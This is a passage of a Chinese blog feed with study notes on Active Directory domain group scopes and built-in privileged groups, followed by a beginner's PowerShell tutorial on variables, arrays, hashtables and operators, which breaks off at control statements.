独立服务器和域没有关系。<br>域控制器用于存放活动目录数据库，是域中必须要有的，而其它三种计算机则不是必须要有的。</p></li><li><p>1.1.7 域内权限解读<br>组（<code>Group</code>）是用户账号的集合。通过向一组用户分配权限，就可以不必向每个用户分别分配权限。<br><strong>1.域本地组</strong> 多域用户访问单域资源（访问同一个域），可以从任何域添加用户账号、通用组和全局组，但只能在其所在的域内指派权限。域本地组不能嵌套在其他组中。<br><strong>2.全局组</strong> 单域用户访问多域资源（必须是同一个域中的用户），只能在创建该全局组的域中添加用户和全局组。可以在域森林的任何域内指派权限。全局组可以嵌套在其他组中。<br><strong>3.通用组</strong> 通用组的成员来自域森林中任何域的用户账号、全局组和其他通用组，可以在该域森林的任何域中指派权限，可以嵌套在其他组中，非常适合在域森林内的跨域访问中使用。可以这样简单的记忆：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域本地组来自全林，作用于本域；</span><br><span class="line">全局组来自本域，作用于全林；</span><br><span class="line">通用组来自全林，作用于全林；</span><br></pre></td></tr></table></figure><p><strong>4.A-G-DL-P策略</strong> A-G-DL-P策略是指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地分配资源权限。</p><ul><li><code>A</code>表示用户账号（<code>Account</code>）</li><li><code>G</code>表示全局组（<code>Global Group</code>）</li><li><code>U</code>表示通用组（<code>Universal Group</code>）</li><li><code>DL</code>表示域本地组（<code>Domain Local Group</code>）</li><li><code>P</code>表示资源权限（<code>Permission</code>，许可）<br>在安装域控制器时，系统会自动生成一些组，成为内置组。”<code>Active Directory</code>用户和计算机”控制台窗口的”<code>Builtin</code>“和”<code>Users</code>“组织单元中的组就是内置组，内置的域本地组在”<code>Builtin</code>“组织单元中。<br><img src="/./2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-1/builtin.png"><br>内置的全局组和通用组在”Users”组织单元中。<br><img src="/./2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-1/users.png"><br>下面介绍几个比较重要的域本地组权限。<br><strong>管理员组</strong> （<code>Administrators</code>）的成员可以不受限制地存取计算机&#x2F;域的资源。它不仅是最具权力的一个组，也是在活动目录和域控制器中默认具有管理员权限的组。该组的成员可以更改<code>Enterprise Admins</code>、<code>Schema Admins</code>和<code>Domain Admins</code>组的成员关系，是域森林中强大的服务管理组。<br><strong>远程登录组</strong> （<code>Remote Desktop Users</code>）的成员具有远程登录权限。<br><strong>打印机操作员组</strong> （<code>PrintOperators</code>）的成员可以管理网络打印机，包括建立、管理及删除网络打印机，并可以在本地登录和关闭域控制器。<br><strong>账号操作员组</strong> （<code>Account Operators</code>）的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器，但是，不能更改属于<code>Administrators</code>或<code>Domain Admins</code>组的账户，也不能修改这些组。在默认情况下，该组中没有成员。<br><strong>服务器操作员组</strong> （<code>ServerOperators</code>）的成员可以管理域服务器，其权限包括建立&#x2F;管理&#x2F;删除任意服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器、变更服务器的系统时间、关闭域控制器等。在默认情况下，该组中没有成员。<br><strong>备份操作员组</strong> （<code>BackupOperators</code>）的成员可以在域控制器中执行备份和还原操作，并可以在本地登录和关闭域控制器。在默认情况下，该组中没有成员。<br><strong>域管理员组</strong> （<code>DomainAdmins</code>）的成员在所有加入域的服务器(工作站)、域控制器和活动目录中均默认拥有完整的管理员权限。因为该组会被添加到自己所在域的<code>Administrators</code>组中，因此可以继承<code>Administrators</code>组的所有权限。同时，该组默认会被添加到每台域成员计算机的本地<code>Administrators</code>组中，这样，<code>Domain Admins</code>组就获得了域中所有计算机的所有权。如果希望某用户成为域系统管理员，建议将该用户添加到<code>Domain Admins</code>组中，而不要直接将该用户添加到<code>Administrators</code>组中。<br><strong>企业系统管理员组</strong> （<code>Enterprise Admins</code>）是域森林根域中的一个组。该组在域森林中的每个域内都是<code>Administrators</code>组的成员，因此对所有域控制器都有完全访问权。<br><strong>架构管理员组</strong> （<code>Schema Admins</code>）是域森林根域中的一个组，可以修改活动目录和域森林的模式。该组是为活动目录和域控制器提供完整权限的域用户组，因此，该组成员的资格是非常重要的。<br><strong>域用户组</strong> （<code>Domain Users</code>）中是所有的域成员。在默认情况下，任何由我们建立的用户账号都属于Domain Users组，而任何由我们建立的计算机账号都属于Domain Computers组。因此，如果想让所有的账号都获得某种资源存取权限，可以将该权限指定给域用户组，或者让城用户组属于具有该权限的组。域用户组默认是内置域<code>Users</code>组的成员。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powershell了解</title>
      <link href="/2022/06/24/powershell%E4%BA%86%E8%A7%A3/"/>
      <url>/2022/06/24/powershell%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们知道<code>powershell</code>的后缀是<code>ps1</code>，哪为什么是<code>ps1</code>而不是<code>ps2</code>,<code>ps3</code>呢？那么理解这个问题呢我们可以看看<code>powershell</code>的特性，<code>powershell</code>是对下完全兼容的，也就是说你使用<code>powershell 5.x</code>的版本来执行<code>powershell v1.0</code>的代码也是完全没有问题的。那么我个人理解一下为什么是<code>ps1</code>，可以这么说，当我们见到<code>ps2</code>后缀之时就是<code>powershell</code>进行大的更新，也就是不对下兼容的时候，所以这里一直是使用<code>ps1</code>后缀。</p><p>那么对于我们的安全人员来说我们用什么版本呢？毫无疑问是<code>v2</code>,为什么呢，因为在<code>win7</code>当中默认安装了<code>v2</code>,而且之后的版本都是兼容<code>v2</code>的，<code>v1</code>版本所有的功能对于我们的需求很多都不能满足，所以<code>v2</code>成为了我们目前来说独一无二的选择，通过下面的方式我们可以看到我们的<code>powershell</code>的版本与一些详细的信息，后面我们的代码，大多都是以<code>v2.0</code>来讨论的。</p><pre><code>powershell Get-Host</code></pre><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">2</span>.<span class="number">0</span></span><br><span class="line">InstanceId       : <span class="number">718</span>bc1d6-db3c-<span class="number">40</span>dd-af4d-c320a7034a8f</span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : zh-CN</span><br><span class="line">CurrentUICulture : zh-CN</span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br></pre></td></tr></table></figure><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><code>PowerShell</code>是一种基于任务的命令行解释器和脚本环境，可以说是一种强大的<code>shell</code>,如同<code>linux</code>的<code>bash</code>,专为系统管理员而设计，以<code>.NET</code>框架为平台，<code>Windows PowerShell</code>帮助<code>IT</code>专业人员和超级用户控制和自动化管理<code>Windows</code>操作系统和运行在操作系统上的应用。现被更广泛用于渗透测试等方面，在不需要写入磁盘的情况下执行命令，也可以逃避<code>Anti-Virus</code>检测。</p><ul><li><p>查看帮助<br><code>cmd</code>命令行界面输入<code>powershell</code>后回车进入<code>powershell</code>命令行，再键入命令<code>get-help</code><br>或<code>cmd</code>命令行直接键入<code>powershell</code> <code>get-help</code><br><img src="/./2022/06/24/powershell%E4%BA%86%E8%A7%A3/powershell.png"></p></li><li><p>命令别名<br><code>powershell Get-Alias</code>获取当前会话中的所有别名。<br><img src="/./2022/06/24/powershell%E4%BA%86%E8%A7%A3/get-alias.png"><br><code>powershell</code>中有很多<code>dos</code>的命令别名，<code>type</code>、<code>help</code>等<br><img src="/./2022/06/24/powershell%E4%BA%86%E8%A7%A3/get-content.png"><br><img src="/./2022/06/24/powershell%E4%BA%86%E8%A7%A3/get-help.png"></p></li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>在<code>Windows PowerShell</code>中，变量的名称以美元符号<code>($)</code>开头，例如<code>$process，$var</code>。 变量的名称不区分大小写，并且包含空格和特殊字符。默认情况下，<code>PowerShell</code>中所有变量的值均为<code>$null</code>。<br><u><strong>注意：</strong>在<code>Windows PowerShell</code>中，特殊字符具有特殊含义。如果在变量名称中使用特殊字符，则需要将它们括在大括号<code>&#123;&#125;</code>中</u></p><ul><li><p>创建变量、打印变量</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$str</span> =  <span class="string">&#x27;aa&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$int</span> = <span class="number">233666</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$str</span></span><br><span class="line">aa</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$int</span></span><br><span class="line"><span class="number">233666</span></span><br></pre></td></tr></table></figure></li><li><p>清空变量、删除变量</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">set-variable</span> test</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">get-variable</span> test</span><br><span class="line"></span><br><span class="line">Name                           Value</span><br><span class="line"><span class="literal">----</span>                           <span class="literal">-----</span></span><br><span class="line">test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">clear-variable</span> test</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">remove-variable</span> test</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">clear-variable</span> test</span><br><span class="line"><span class="built_in">Clear-Variable</span> : 找不到名为“test”的变量。</span><br><span class="line">所在位置 行:<span class="number">1</span> 字符: <span class="number">15</span></span><br><span class="line">+ <span class="built_in">clear-variable</span> &lt;&lt;&lt;&lt;  test</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (test:String) [<span class="built_in">Clear-Variable</span>], ItemNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : VariableNotFound,Microsoft.PowerShell.Commands.ClearVariableCommand</span><br></pre></td></tr></table></figure></li><li><p>变量类型</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$str</span>.gettype()</span><br><span class="line"></span><br><span class="line">IsPublic IsSerial Name                                     BaseType</span><br><span class="line"><span class="literal">--------</span> <span class="literal">--------</span> <span class="literal">----</span>                                     <span class="literal">--------</span></span><br><span class="line">True     True     String                                   System.Object</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$int</span>.gettype()</span><br><span class="line"></span><br><span class="line">IsPublic IsSerial Name                                     BaseType</span><br><span class="line"><span class="literal">--------</span> <span class="literal">--------</span> <span class="literal">----</span>                                     <span class="literal">--------</span></span><br><span class="line">True     True     Int32                                    System.ValueType</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$qwe</span>.gettype()</span><br><span class="line"></span><br><span class="line">IsPublic IsSerial Name                                     BaseType</span><br><span class="line"><span class="literal">--------</span> <span class="literal">--------</span> <span class="literal">----</span>                                     <span class="literal">--------</span></span><br><span class="line">True     True     Object[]                                 System.Array</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$test</span> <span class="operator">-is</span> [<span class="built_in">string</span>]</span><br><span class="line">True</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$qwe</span> <span class="operator">-is</span> [<span class="built_in">array</span>]</span><br><span class="line">True</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$aa</span> <span class="operator">-is</span> [<span class="built_in">int</span>]</span><br><span class="line">True</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$aa</span> <span class="operator">-is</span> [<span class="built_in">int</span><span class="type">32</span>]</span><br><span class="line">True</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$aa</span> <span class="operator">-is</span> [<span class="built_in">int</span><span class="type">64</span>]</span><br><span class="line">False</span><br></pre></td></tr></table></figure></li></ul><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul><li><p>数组创建</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数组的创建可以通过下面五种方式来创建，在适当的条件下选择适当的方式创建即可</span><br><span class="line"></span><br><span class="line"><span class="variable">$array</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="variable">$array</span> = <span class="number">1</span>..<span class="number">4</span>   <span class="comment">#定义一个数组，包含数字1-4</span></span><br><span class="line"><span class="variable">$array</span>=<span class="number">1</span>,<span class="string">&quot;2017&quot;</span>,([<span class="type">System.Guid</span>]::NewGuid()),(<span class="built_in">get-date</span>)</span><br><span class="line"><span class="variable">$a</span>=<span class="selector-tag">@</span>()  <span class="comment"># 空数组</span></span><br><span class="line"><span class="variable">$a</span>=,<span class="string">&quot;1&quot;</span> <span class="comment"># 一个元素的数组</span></span><br></pre></td></tr></table></figure></li><li><p>数组访问</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;44&#x27;</span>,<span class="string">&#x27;55&#x27;</span>,<span class="string">&#x27;qwe&#x27;</span>,<span class="number">66</span>,<span class="number">77</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">44</span></span><br><span class="line"><span class="number">55</span></span><br><span class="line">qwe</span><br><span class="line"><span class="number">66</span></span><br><span class="line"><span class="number">77</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span>[<span class="number">3</span>]    <span class="comment">#数组第四个元素</span></span><br><span class="line"><span class="number">44</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span>[<span class="number">2</span><span class="type">..5</span>] <span class="comment">#数组第三到第六个元素</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">44</span></span><br><span class="line"><span class="number">55</span></span><br><span class="line">qwe</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span>[-<span class="number">3</span><span class="type">..</span>-<span class="number">1</span>]   <span class="comment">#数组最后三个元素</span></span><br><span class="line">qwe</span><br><span class="line"><span class="number">66</span></span><br><span class="line"><span class="number">77</span></span><br></pre></td></tr></table></figure></li><li><p>数组长度、元素追加、元素删除</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span>.length</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span> += <span class="string">&#x27;66666666666666&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span>.length</span><br><span class="line"><span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$array</span> = <span class="number">1</span>..<span class="number">10</span></span><br><span class="line">[<span class="type">System.Collections.ArrayList</span>]<span class="variable">$arraylist</span> = <span class="variable">$array</span></span><br><span class="line"><span class="variable">$arraylist</span>.RemoveAt(<span class="number">4</span>)</span><br><span class="line"><span class="variable">$null</span> = <span class="variable">$arraylist</span>.Add(<span class="number">11</span>)</span><br><span class="line"><span class="variable">$arraylist</span>.Insert(<span class="number">0</span>,<span class="string">&#x27;新元素&#x27;</span>)</span><br><span class="line"><span class="variable">$arraylist</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、定义了一个数组，包含<span class="number">1</span>到<span class="number">10</span>，一共<span class="number">10</span>个数组元素。</span><br><span class="line"><span class="number">2</span>、将<span class="variable">$array</span>数组变量赋值给<span class="variable">$arraylist</span>变量，这样就将数组变成了ArrayList</span><br><span class="line"><span class="number">3</span>、分别执行RemoveAt()、Add()、Insert()等操作</span><br></pre></td></tr></table></figure></li></ul><h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><p><code>PowerShell</code>哈希表是一种数据结构，用于存储一个或多个键&#x2F;值对。也称为字典或关联数组。在<code>PowerShell</code>中，每个哈希表都有一个哈希表<code>(System.Collections.Hashtable)</code>对象。我们可以在<code>PowerShell</code>中使用<code>Hashtable</code>对象的属性和方法。 哈希表中的键和值也是<code>.NET</code>类型的对象。<br>在引入<code>PowerShell</code>版本<code>3.0</code>之后，我们可以使用<code>[ordered]</code>属性在<code>PowerShell</code>中创建一个有序字典<code>(System.Collections.Specialized.OrderedDictionary)</code>。<br><u><strong>注：</strong>有序字典和哈希表之间的主要区别在于字典中的键始终按照我们列出的顺序显示。但是哈希表中键的顺序不确定。</u></p><ul><li>哈希表的创建、存数组、<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stu</span>=<span class="selector-tag">@</span>&#123; Name = <span class="string">&quot;test&quot;</span>;Age=<span class="string">&quot;12&quot;</span>;sex=<span class="string">&quot;man&quot;</span> &#125;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$stu</span>.keys</span><br><span class="line">Name</span><br><span class="line">Age</span><br><span class="line">sex</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$stu</span>.values</span><br><span class="line">test</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="built_in">man</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$stu1</span>=<span class="selector-tag">@</span>&#123; Name = <span class="string">&quot;hei&quot;</span>;Age=<span class="string">&quot;12&quot;</span>;sex=<span class="string">&quot;man&quot;</span>;Books=<span class="string">&quot;kali&quot;</span>,<span class="string">&quot;sqlmap&quot;</span>,<span class="string">&quot;powershell&quot;</span> &#125;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$stu1</span>.count</span><br><span class="line"><span class="number">4</span></span><br><span class="line"></span><br><span class="line">哈希表的插入与删除:</span><br><span class="line"><span class="variable">$Student</span>=<span class="selector-tag">@</span>&#123;&#125;</span><br><span class="line"><span class="variable">$Student</span>.Name=<span class="string">&quot;hahaha&quot;</span></span><br><span class="line"><span class="variable">$stu</span>.Remove(<span class="string">&quot;Name&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ul><li><p>常见用法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">· &gt;:将输出保存到指定文件中（用法：<span class="built_in">Get-Process</span>&gt;output.txt）</span><br><span class="line"></span><br><span class="line">· &gt;&gt;:将脚本的输出追加到指定文件中（用法：test.ps1&gt;&gt;output.txt）</span><br><span class="line"></span><br><span class="line">· <span class="number">2</span>&gt;:将错误输出到指定文件中（<span class="built_in">Get-Porcess</span> none <span class="number">2</span>&gt;Errors.txt）</span><br><span class="line"></span><br><span class="line">· <span class="number">2</span>&gt;&gt;:将错误追加到指定文件中（<span class="built_in">Get-Process</span> none <span class="number">2</span>&gt; logs<span class="literal">-Errors</span>.txt）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-eq</span>:等于运算符（用法：<span class="variable">$var1</span> –eq <span class="variable">$var2</span>，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-gt</span>:大于运算符（用法：<span class="variable">$var1</span> –gt <span class="variable">$var2</span>，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-match</span>:匹配运算符，搜索字符串是否在文中出现（用法：<span class="variable">$Text</span> –match <span class="variable">$string</span>返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-replace</span>:替换字符串（用法：<span class="variable">$Text</span> –replace 被替换的字符,替换的字符，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-in</span>：测试一个字符或数字是否出现在文本中或列表中，声明列表直接使用（）</span><br></pre></td></tr></table></figure></li><li><p>算数运算符</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+ (加法)</span><br><span class="line">- (减法)</span><br><span class="line">* (乘法)</span><br><span class="line">/ (除法)</span><br><span class="line">% (模数)</span><br></pre></td></tr></table></figure></li><li><p>赋值运算符</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-= (赋值运算符)</span><br><span class="line">+= (加法运算符)</span><br><span class="line">-= (减法赋值运算符)</span><br><span class="line">*= (乘法分配运算符)</span><br><span class="line">/= (部门分配运算符)</span><br><span class="line">%= (模分配运算符)</span><br><span class="line">++ (增量运算符)</span><br><span class="line">- (减量运算符)</span><br></pre></td></tr></table></figure></li><li><p>相等运算符</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-eq</span> (等于)</span><br><span class="line"><span class="operator">-ne</span> (不等于)</span><br><span class="line"><span class="operator">-gt</span> (大于)</span><br><span class="line"><span class="operator">-ge</span> (大于或等于)</span><br><span class="line"><span class="operator">-lt</span> (小于)</span><br><span class="line"><span class="operator">-le</span> (小于或等于)</span><br></pre></td></tr></table></figure></li><li><p>匹配运算符</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-like</span></span><br><span class="line"><span class="operator">-notlike</span></span><br><span class="line"><span class="operator">-match</span></span><br><span class="line"><span class="operator">-notmatch</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$</span><span class="variable">$</span> = <span class="string">&#x27;aabbccddee44gff&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$1</span> = <span class="string">&#x27;cd*&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$</span><span class="variable">$</span> <span class="operator">-like</span> <span class="variable">$1</span></span><br><span class="line">True</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$1</span> <span class="operator">-like</span> <span class="variable">$</span><span class="variable">$</span></span><br><span class="line">False</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span> = <span class="string">&#x27;aabbccdd12233&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$b</span> = <span class="string">&#x27;bbc&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span> <span class="operator">-like</span> <span class="variable">$b</span></span><br><span class="line">False</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="variable">$a</span> <span class="operator">-notlike</span> <span class="variable">$b</span></span><br><span class="line">True</span><br></pre></td></tr></table></figure></li><li><p>包含运算符</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-contains</span></span><br><span class="line"><span class="operator">-notcontains</span></span><br><span class="line"><span class="operator">-in</span></span><br><span class="line"><span class="operator">-notin</span></span><br></pre></td></tr></table></figure></li><li><p>逻辑运算符</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-and</span> (逻辑与)</span><br><span class="line"><span class="operator">-or</span> (逻辑或)</span><br><span class="line"><span class="operator">-xor</span> (逻辑XOR)</span><br><span class="line"><span class="operator">-not</span> (逻辑非)</span><br><span class="line">! (与逻辑非相同，求反)</span><br></pre></td></tr></table></figure></li></ul><h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><ul><li>if-else<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 